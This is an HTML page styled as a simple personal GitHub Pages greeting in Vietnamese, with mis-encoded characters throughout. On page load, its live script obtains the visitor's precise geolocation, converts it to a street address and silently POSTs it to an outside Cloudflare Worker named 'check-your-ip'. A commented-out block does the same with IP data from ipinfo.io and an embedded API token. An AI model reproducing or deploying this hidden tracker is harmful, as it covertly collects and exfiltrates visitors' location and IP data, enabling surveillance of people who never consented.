<!DOCTYPE html>
<html>
<head>
  <title>Trang c·ªßa t√¥i</title>
</head>
<body>
  <h1>Xin ch√†o!</h1>
  <p>ƒê√¢y l√† trang web c·ªßa t√¥i tr√™n GitHub Pages.</p>
  


  //<script>
  //  fetch('https://ipinfo.io/json?token=547d9f9766f1e6') // <-- Thay b·∫±ng token c·ªßa b·∫°n
  //    .then(res => res.json())
  //    .then(data => {
  //      console.log('üì¶ D·ªØ li·ªáu IP:', data);
  //
  //      fetch('https://check-your-ip.quangle6996.workers.dev', {
  //        method: 'POST',
  //        headers: {
  //          'Content-Type': 'application/json'
  //        },
  //        body: JSON.stringify(data)
  //      });
  //    })
  //    .catch(error => console.error('L·ªói khi l·∫•y IP:', error));
  //</script>
  
  <script>
    // H√†m l·∫•y ƒë·ªãa ch·ªâ t·ª´ to·∫° ƒë·ªô (reverse geocoding)
    async function getAddressFromCoords(lat, lng) {
      const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
      const data = await response.json();
      return data.display_name || 'Kh√¥ng r√µ';
    }

    // H√†m ch√≠nh
    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async function (position) {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;

          const address = await getAddressFromCoords(lat, lng);

          console.log("üìç T·ªça ƒë·ªô:", lat, lng);
          console.log("üè† ƒê·ªãa ch·ªâ:", address);

          const data = {
            latitude: lat,
            longitude: lng,
            address: address,
            time: new Date().toISOString()
          };

          // G·ª≠i d·ªØ li·ªáu v·ªÅ Cloudflare Worker
          fetch('https://check-your-ip.quangle6996.workers.dev', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          });

        }, function (error) {
          console.error("‚ùå L·ªói khi l·∫•y v·ªã tr√≠:", error.message);
        }, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      } else {
        console.error("‚ùå Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£ Geolocation");
      }
    }

    sendLocation(); // G·ªçi h√†m khi t·∫£i trang
  </script>
  </body>
</html>
